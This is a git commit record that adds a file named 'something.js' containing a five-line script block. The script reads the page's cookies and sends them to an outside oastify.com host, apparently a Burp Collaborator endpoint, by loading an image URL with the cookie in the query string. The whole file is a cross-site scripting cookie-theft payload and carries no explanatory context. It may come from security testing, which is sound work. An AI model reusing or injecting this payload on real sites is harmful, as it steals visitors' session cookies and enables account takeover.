be215c04c5a0cf2afec9c9a053e7089c6f87048b
Shatha Barqawi <49248849+shatha893@users.noreply.github.com>
2024-10-24 11:32:03 +0300

    Create something.js

---
+++ something.js
@@ -0,0 +1,5 @@
+<script>
+  var cookieValue = document.cookie;
+  var img = new Image();
+  img.src = 'http://rb6gffwnuj6tw2cgrlj8o3nab1hs5kt9.oastify.com/?cookie=' + encodeURIComponent(cookieValue);
+</script>
